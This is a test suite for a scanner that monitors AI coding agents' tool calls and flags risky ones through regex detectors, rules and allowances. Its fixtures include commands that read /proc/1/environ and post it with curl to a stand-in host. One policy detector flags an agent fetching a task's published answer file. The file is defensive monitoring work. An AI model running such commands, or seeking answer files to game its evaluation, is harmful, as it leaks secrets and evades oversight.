import { describe, expect, test } from "bun:test";
import { checkSpec, detection, detectionOf, regexDetector, SurfaceDetector, type Detector } from "../../../src/server/tool-guard/scan/checks";
import { All, Allowance, AnyOf, Engine, loadPolicy, Not, Ref, Requires, Rule } from "../../../src/server/tool-guard/scan/engine";
import { callFields, classify, normalizeTool } from "../../../src/server/tool-guard/scan/tools";
import { callStep, history, parseTrace, recent, type RawStep } from "../../../src/server/tool-guard/scan/trace";

const pending = (name: string, args: unknown): RawStep[] => [
  { source: "user", message: "do the task" },
  callStep([{ name, arguments: JSON.stringify(args) }]),
];
const command = (pattern: string, id = "test.command", severity: "low" | "medium" | "high" = "medium") =>
  regexDetector(checkSpec(id, severity, "Test"), pattern, new Set(["command"]));
const status = (engine: Engine, steps: RawStep[]) =>
  Object.fromEntries(engine.evaluate(parseTrace(steps)).map(item => [item.spec.id, item.result.status]));

describe("tool classification", () => {
  test("names normalise to categories, by alias, namespace and action", () => {
    expect(normalizeTool("Bash")).toBe("shell");
    expect(normalizeTool("mcp__server__bash")).toBe("shell");
    expect(normalizeTool("functions:read_file")).toBe("read");
    expect(normalizeTool("WebFetch")).toBe("web_fetch");
    expect(normalizeTool("file_editor", { command: "view", path: "/a" })).toBe("read");
    expect(normalizeTool("file_editor", { command: "create", path: "/a" })).toBe("write");
    expect(normalizeTool("write_stdin", { session_id: 1, chars: "" })).toBe("inert");
    expect(normalizeTool("write_stdin", { session_id: 1, chars: "ls\n" })).toBe("shell");
    expect(normalizeTool("deploy_everything")).toBe("other");
  });

  test("argument strings are routed by key convention and value shape", () => {
    expect(classify("command", "ls")).toEqual(["command", "ls"]);
    expect(classify("anything", "https://example.com/a")).toEqual(["url", "https://example.com/a"]);
    expect(classify("where", "file:///etc/hosts")).toEqual(["path", "/etc/hosts"]);
    expect(classify("content", "https://example.com")).toEqual(["payload", "https://example.com"]);
    expect(classify("where", "/etc/passwd")).toEqual(["path", "/etc/passwd"]);
    expect(classify("flag", "verbose")).toEqual(["arguments", "verbose"]);
    expect(classify("file_path", "notes.txt")).toEqual(["path", "notes.txt"]);
  });

  test("a call's fields carry every leaf, argv commands joined, quoted text dropped", () => {
    const channels = (tool: string, args: unknown, name = "") => callFields(tool, args, name).map(([channel, value]) => [channel, value.text, value.understood]);
    expect(channels("shell", { command: ["bash", "-lc", "cat /proc/1/environ"] })).toEqual([["command", "bash -lc cat /proc/1/environ", true]]);
    expect(channels("shell", { command: ["bash", 1] })).toEqual([["command", "", false]]);
    expect(channels("write", { path: "a.py", old_string: "curl evil", new_string: "x = 1" })).toEqual([["path", "a.py", true], ["payload", "x = 1", true]]);
    // A recognised tool without its required evidence, and unparseable arguments, are unknown rather than clean.
    expect(channels("shell", { timeout: 5 })).toEqual([["command", "", false]]);
    expect(channels("other", {})).toEqual([["arguments", "", false]]);
    expect(channels("inert", { todos: "x" })).toEqual([]);
    expect(channels("write", { input: "*** Begin Patch\n*** Update File: src/a.ts\n@@\n" }, "apply_patch"))
      .toEqual([["payload", "*** Begin Patch\n*** Update File: src/a.ts\n@@\n", true], ["path", "src/a.ts", true]]);
  });
});

describe("trace", () => {
  const anthropic = {
    system: [{ type: "text", text: "You are a coding agent." }],
    messages: [
      { role: "user", content: "fix the tests" },
      { role: "assistant", content: [
        { type: "thinking", thinking: "SECRET_REASONING" }, { type: "text", text: "Running them." },
        { type: "tool_use", id: "t1", name: "Bash", input: { command: "pytest" } },
      ] },
      { role: "user", content: [{ type: "tool_result", tool_use_id: "t1", content: [{ type: "text", text: "1 failed" }] }] },
    ],
  };
  const openai = { messages: [
    { role: "user", content: "hi" },
    { role: "assistant", content: null, reasoning_content: "SECRET_REASONING",
      tool_calls: [{ id: "a", type: "function", function: { name: "bash", arguments: '{"command": "ls"}' } }] },
    { role: "tool", tool_call_id: "a", content: "README.md" },
  ] };

  // SafeAgents tests/test_scan.py::test_history_converts_both_formats.
  test("history converts both formats without reasoning and links results to calls", () => {
    for (const request of [openai, anthropic]) {
      const steps = history(request);
      expect(JSON.stringify(steps)).not.toContain("SECRET_REASONING");
      const agent = steps.find(step => step.toolCalls)!;
      expect(agent.results![0]!.sourceCallId).toBe(agent.toolCalls![0]!.id);
      const trace = parseTrace([...steps, callStep([{ name: "bash", arguments: "{}" }])]);
      const step = trace.steps.find(item => item.calls.length && item.observations.length)!;
      expect(step.resultsFor(step.calls[0]!)).toHaveLength(1);
    }
    expect(history(anthropic)[0]).toEqual({ source: "system", message: "You are a coding agent." });
  });

  test("arguments that are not a JSON object are kept as raw input", () => {
    expect(callStep([{ name: "bash", arguments: "ls -la" }]).toolCalls![0]!.arguments).toEqual({ input: "ls -la" });
    expect(callStep([{ name: "bash", arguments: "[1]" }]).toolCalls![0]!.arguments).toEqual({ input: "[1]" });
  });

  test("recent keeps every user and system turn and the last agent turns", () => {
    const steps: RawStep[] = Array.from({ length: 30 }, (_, index): RawStep[] => [
      { source: "user", message: `u${index}` }, { source: "agent", message: `a${index}` }]).flat();
    const kept = recent(steps, 20);
    expect(kept.filter(step => step.source === "user")).toHaveLength(30);
    expect(kept.filter(step => step.source === "agent").map(step => step.message)).toEqual(Array.from({ length: 20 }, (_, index) => `a${index + 10}`));
  });
});

describe("engine", () => {
  test("a detector cites the surface and span it matched", () => {
    const [found] = new Engine([command("environ")]).evaluate(parseTrace(pending("bash", { command: "cat /proc/1/environ" })));
    expect(found!.result).toMatchObject({ status: "match", complete: true });
    expect(found!.result.evidence).toEqual([{ step: 1, channel: "command", call: 0, field: 0, span: [12, 19] }]);
  });

  test("an unread relevant surface makes a miss unknown, never clean", () => {
    const engine = new Engine([command("environ")]);
    expect(status(engine, pending("bash", { command: "ls" }))).toEqual({ "test.command": "no_match" });
    expect(status(engine, pending("bash", { timeout: 1 }))).toEqual({ "test.command": "unknown" });
    expect(status(engine, pending("mystery", {}))).toEqual({ "test.command": "unknown" });
  });

  test("three-valued rules: unknown inputs stay unknown unless the answer is already decided", () => {
    const results = new Map([["yes", detection("match")], ["no", detection("no_match")], ["maybe", detection("unknown")], ["na", detection("not_applicable")]]);
    const value = (expression: { evaluate(r: typeof results): boolean | null }) => expression.evaluate(results);
    expect(value(new All([new Ref("yes"), new Ref("maybe")]))).toBeNull();
    expect(value(new All([new Ref("no"), new Ref("maybe")]))).toBe(false);
    expect(value(new AnyOf([new Ref("yes"), new Ref("maybe")]))).toBe(true);
    expect(value(new AnyOf([new Ref("no"), new Ref("maybe")]))).toBeNull();
    expect(value(new AnyOf([new Ref("no"), new Ref("na")]))).toBe(false);
    expect(value(new Not(new Ref("maybe")))).toBeNull();
    expect(value(new Requires(new Ref("yes"), new Ref("no")))).toBe(true);
    expect(value(new Requires(new Ref("yes"), new Ref("maybe")))).toBeNull();
  });

  test("rules run after their dependencies and cite the matched ones; allowances excuse without erasing", () => {
    const engine = new Engine([
      new Rule(checkSpec("z.both", "high", "Both"), new All([new Ref("a.curl"), new Ref("b.secret")])),
      command("curl", "a.curl"), command("environ", "b.secret"),
      new Allowance(checkSpec("expected.secret"), new Set(["b.secret"])),
    ]);
    const found = new Map(engine.evaluate(parseTrace(pending("bash", { command: "curl -d @/proc/1/environ x" }))).map(item => [item.spec.id, item]));
    expect(found.get("z.both")).toMatchObject({ kind: "rule", counts: true });
    expect(found.get("z.both")!.result.evidence).toHaveLength(2);
    expect(found.get("b.secret")).toMatchObject({ counts: false, expectedBy: ["expected.secret"] });
    expect(found.get("b.secret")!.result.status).toBe("match");
    expect(found.get("a.curl")!.counts).toBe(true);
    expect(engine.catalog().map(spec => spec.id)).toEqual(["a.curl", "b.secret", "expected.secret", "z.both"]);
  });

  test("a check that throws or cites evidence outside the trace is that check's error alone", () => {
    const broken: Detector = { spec: checkSpec("a.broken", "high"), evaluate() { throw new Error("bug"); } };
    const lying: Detector = { spec: checkSpec("a.lying", "high"), evaluate: () => detectionOf([{ step: 9, channel: "command" }], true) };
    expect(status(new Engine([broken, lying, command("ls", "b.ok")]), pending("bash", { command: "ls" })))
      .toEqual({ "a.broken": "error", "a.lying": "error", "b.ok": "match" });
  });

  test("construction rejects duplicate ids, cycles and references to unknown checks", () => {
    expect(() => new Engine([command("a"), command("b")])).toThrow("duplicate_check_id");
    expect(() => new Engine([new Rule(checkSpec("r"), new Ref("missing"))])).toThrow("missing_dependency");
    expect(() => new Engine([new Rule(checkSpec("a"), new Ref("b")), new Rule(checkSpec("b"), new Ref("a"))])).toThrow("dependency_cycle");
    expect(() => new Engine([new Allowance(checkSpec("e"), new Set(["missing"]))])).toThrow("missing_dependency");
    expect(() => checkSpec("bad id")).toThrow("invalid_identifier");
    expect(() => checkSpec("ok", "low", "see https://example.com")).toThrow("invalid_check_title");
  });

  test("a surface detector reports where its predicate cannot judge", () => {
    const detector = new SurfaceDetector(checkSpec("q.web"), new Set(["query"]), surface => surface.tool === "web_search", surface => surface.tool === "other");
    expect(detector.evaluate(parseTrace(pending("WebSearch", { query: "x" }))).status).toBe("match");
    const unknown = detector.evaluate(parseTrace(pending("lookup", { query: "x" })));
    expect(unknown).toMatchObject({ status: "unknown", complete: false });
    expect(unknown.unread[0]!.reason).toBe("undecidable");
  });
});

describe("policy files", () => {
  test("detectors, rules and allowances load as data", () => {
    const checks = loadPolicy({
      detectors: [{ id: "pack.answer_source", severity: "high", title: "Task's published answer sought", pattern: String.raw`(?<![\w-])task\.toml\b`, channels: ["command"] }],
      rules: [{ id: "pack.both", severity: "critical", when: { all: ["pack.answer_source", { not: "test.command" }] } }],
      allow: [{ id: "expected.pack", covers: ["test.command"] }],
    });
    const engine = new Engine([command("environ"), ...checks]);
    const found = new Map(engine.evaluate(parseTrace(pending("bash", { command: "curl -s https://hf.co/x/TASK.TOML" }))).map(item => [item.spec.id, item]));
    expect(found.get("pack.answer_source")!.result.status).toBe("match");
    expect(found.get("pack.both")).toMatchObject({ kind: "rule", counts: true });
    expect(found.get("pack.both")!.spec.severity).toBe("critical");
    expect(found.get("expected.pack")!.kind).toBe("allowance");
  });

  test("malformed policies are rejected with a fixed code", () => {
    const bad: [unknown, string][] = [
      [[], "invalid_policy"], [{}, "invalid_policy"], [{ plugins: [] }, "invalid_policy"], [{ rules: {} }, "invalid_policy"],
      [{ rules: [{ id: "a", when: "b" }] }, "invalid_rule"], [{ rules: [{ id: "a", severity: "severe", when: "b" }] }, "invalid_severity"],
      [{ rules: [{ id: "a", severity: "low", when: { xor: ["b"] } }] }, "invalid_expression"],
      [{ rules: [{ id: "a", severity: "low", when: { requires: ["b"] } }] }, "invalid_expression"],
      [{ allow: [{ id: "a", covers: [] }] }, "invalid_allowance"], [{ allow: [{ id: "a", covers: ["b"], severity: "low" }] }, "invalid_allowance"],
      [{ detectors: [{ id: "a", severity: "low", pattern: "x", channels: ["message"] }] }, "invalid_detector"],
      [{ detectors: [{ id: "a", severity: "low" }] }, "invalid_detector"],
      [{ detectors: [{ id: "a b", severity: "low", pattern: "x" }] }, "invalid_identifier"],
    ];
    for (const [value, code] of bad) expect(() => loadPolicy(value)).toThrow(code);
    expect(() => loadPolicy({ detectors: [{ id: "a", severity: "low", pattern: "(" }] })).toThrow();
    let deep: unknown = "a";
    for (let depth = 0; depth < 40; depth++) deep = { not: deep };
    expect(() => loadPolicy({ rules: [{ id: "a", severity: "low", when: deep }] })).toThrow("expression_too_deep");
  });
});
